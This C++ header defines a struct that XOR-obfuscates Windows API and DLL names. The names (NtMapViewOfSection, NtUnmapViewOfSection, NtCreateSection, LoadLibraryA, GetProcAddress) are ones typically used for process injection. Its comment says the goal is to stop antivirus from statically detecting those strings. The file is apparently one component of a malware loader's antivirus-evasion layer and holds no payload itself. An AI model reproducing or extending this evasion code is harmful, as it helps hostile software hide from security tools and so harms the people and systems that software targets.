#pragma once
#include "StringCryptor.h"

// GLOBAL STRING TABLE
// AV may statically detect obfuscated strings being passed to APIs
// Passing pointers into this struct, we can force compile
// indirect references to encrypted data instead.
struct AV_stringTable {

	std::string NtUnmapViewOfSection;
	std::string NtMapViewOfSection;
	std::string NtCreateSection;
	std::wstring Ntdll;
	std::wstring Kernel32;
	std::string LoadLibraryA;
	std::string GetProcAddress;

	std::string wstringtostring(std::wstring ws)
	{
		return std::string(ws.begin(), ws.end());
	}

	AV_stringTable() {
		XorS(sNtUnmapViewOfSection, "NtUnmapViewOfSection");
		XorS(sNtMapViewOfSection, "NtMapViewOfSection");
		XorS(sNtCreateSection, "NtCreateSection");
		XorS(sNtdll, "ntdll");
		XorS(sKernel32, "Kernel32");
		XorS(sLoadLibraryA, "LoadLibraryA");
		XorS(sGetProcAddress, "GetProcAddress");

		NtUnmapViewOfSection = wstringtostring(sNtUnmapViewOfSection.decrypt());
		NtMapViewOfSection = wstringtostring(sNtMapViewOfSection.decrypt());
		NtCreateSection = wstringtostring(sNtCreateSection.decrypt());
		Ntdll = sNtdll.decrypt();
		Kernel32 = sKernel32.decrypt();
		LoadLibraryA = wstringtostring(sLoadLibraryA.decrypt());
		GetProcAddress = wstringtostring(sGetProcAddress.decrypt());
	}
};